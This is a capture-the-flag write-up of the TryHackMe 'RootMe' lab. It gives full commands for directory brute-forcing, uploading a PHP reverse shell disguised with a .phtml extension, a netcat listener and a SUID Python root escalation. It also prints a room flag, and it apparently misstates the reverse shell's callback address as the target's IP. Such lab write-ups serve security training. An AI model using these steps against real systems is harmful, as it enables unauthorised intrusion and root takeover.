<p align="right">
  <sub>
    <b>Platform:</b> TryHackMe<br>
    <b>Difficulty:</b> Easy<br>
    <b>Status:</b> Completed ✅<br>
    <b>URL:</b> <a href="https://tryhackme.com/room/rrootme">RootMe</a><br>
    <b>Date:</b> Mar 03, 2026<br>
    <b>Tags:</b> #tryhackme #easy #thm
  </sub>
</p>

---

# RootMe

## 🧠 Overview

RootMe is a beginner-friendly Linux box focused on web exploitation and SUID-based privilege escalation. The attack chain involves discovering a file upload endpoint via directory brute-forcing, bypassing a file extension filter to upload a PHP reverse shell, and then abusing a SUID Python binary to escalate to root.

---

## 🎯 Objectives

- Gain initial foothold via a PHP reverse shell upload
- Bypass file extension filtering on the upload endpoint
- Escalate privileges using a SUID binary
- Retrieve `user.txt` and `root.txt`

---

## 🔍 Reconnaissance & Initial Analysis

I started with an nmap service scan against the target:

```bash
nmap -sV 10.10.110.118
```

This revealed an open HTTP port (80) alongside SSH. With a web service running, I moved on to directory brute-forcing using Gobuster:

```bash
gobuster dir -u 10.10.110.118 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Gobuster uncovered an `/uploads` directory and a file upload panel — a clear target for getting a shell onto the box.

---

## ⚙️ Exploitation

I grabbed pentestmonkey's PHP reverse shell from GitHub:

> https://github.com/pentestmonkey/php-reverse-shell

Updated the connection details:

- `$ip` → `10.10.110.118`
- `$port` → `9001`

When I tried uploading the `.php` file directly, the server rejected it. To bypass this, I renamed the file to `.phtml` — PHP still executes it but the filter didn't catch it:

```bash
mv php_reverse_shell.php php_reverse_shell.phtml
```

Started a Netcat listener and triggered the shell:

```bash
nc -lvnp 9001
```

Stabilised with a proper TTY:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

Located `user.txt`:

```bash
find / -type f -name user.txt 2>/dev/null
```

---

## 🔐 Privilege Escalation

Searched for SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

This flagged `/usr/bin/python` as SUID. Exploited it with:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

The `-p` flag preserves elevated privileges, giving a full root shell.

---

## 🏁 Flags

| Flag | Value |
|------|-------|
| Root Flag | `THM{pr1v1l3g3_3sca4l4ti0n}` |

---

## 🧩 Key Takeaways

- Extension filtering alone is not enough — alternate extensions like `.phtml` are often overlooked. A proper allowlist is the fix.
- SUID on interpreters is dangerous — granting SUID to Python gives any user a trivial path to root.
- Always check for SUID binaries early — `find / -perm -u=s -type f 2>/dev/null` should be a standard enumeration step.

---

## 🛠️ Tools & References

| Tool | Purpose |
|------|---------|
| `nmap` | Port and service enumeration |
| `gobuster` | Web directory brute-forcing |
| [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell) | PHP reverse shell payload |
| `netcat` | Listener for catching reverse shell |
| [GTFOBins - Python](https://gtfobins.github.io/gtfobins/python/) | SUID Python privilege escalation reference |
